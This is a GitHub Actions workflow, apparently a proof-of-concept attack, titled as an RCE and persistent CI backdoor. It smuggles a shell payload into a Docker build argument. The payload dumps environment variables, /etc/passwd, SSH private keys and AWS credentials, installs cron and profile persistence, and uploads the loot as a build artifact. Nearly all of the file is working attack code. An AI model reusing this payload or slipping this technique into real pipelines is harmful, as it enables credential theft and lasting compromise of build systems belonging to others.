name: Critical RCE & Persistent CI Backdoor - Enhanced Leak

on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Inject, Leak, and Persist
        run: |
          mkdir -p ./taskcluster/docker/python
          cp Dockerfile ./taskcluster/docker/python/

          PAYLOAD=$(cat <<'EOF'
          echo "[INFO] Dumping extended CI context..." > /leaks.txt
          {
            echo "----- ID -----"
            id

            echo "----- ENV -----"
            printenv

            echo "----- UNAME -----"
            uname -a

            echo "----- LS / -----"
            ls -la /

            echo "----- LS /etc -----"
            ls -la /etc

            echo "----- /etc/passwd -----"
            cat /etc/passwd

            echo "----- /root/.ssh/id_rsa (if exists) -----"
            cat /root/.ssh/id_rsa || echo "No SSH private key found"

            echo "----- GitHub Environment Variables -----"
            env | grep GITHUB || echo "No GitHub env vars found"

            echo "----- AWS Credentials -----"
            cat /root/.aws/credentials || echo "No AWS creds found"

            echo "----- Running Processes -----"
            ps aux

            echo "----- Docker Socket -----"
            ls -la /var/run/docker.sock || echo "No Docker socket found"

          } >> /leaks.txt

          echo "[INFO] Installing persistent runtime backdoor..." >> /leaks.txt
          echo '#!/bin/sh' > /usr/local/bin/init.sh
          echo 'echo "[BACKDOOR] Runtime triggered" >> /runtime-leak.log' >> /usr/local/bin/init.sh
          echo 'printenv >> /runtime-leak.log' >> /usr/local/bin/init.sh
          echo 'ps aux >> /runtime-leak.log' >> /usr/local/bin/init.sh
          chmod +x /usr/local/bin/init.sh
          echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root
          echo '/usr/local/bin/init.sh' >> /etc/profile
          EOF
          )

          docker build \
            --build-arg PYTHON_VERSION="$PAYLOAD" \
            -t compromised ./taskcluster/docker/python

          docker run --rm compromised cat /leaks.txt > output.txt

      - name: Upload Leak Artifact
        uses: actions/upload-artifact@v4
        with:
          name: ci-leaks-enhanced
          path: output.txt
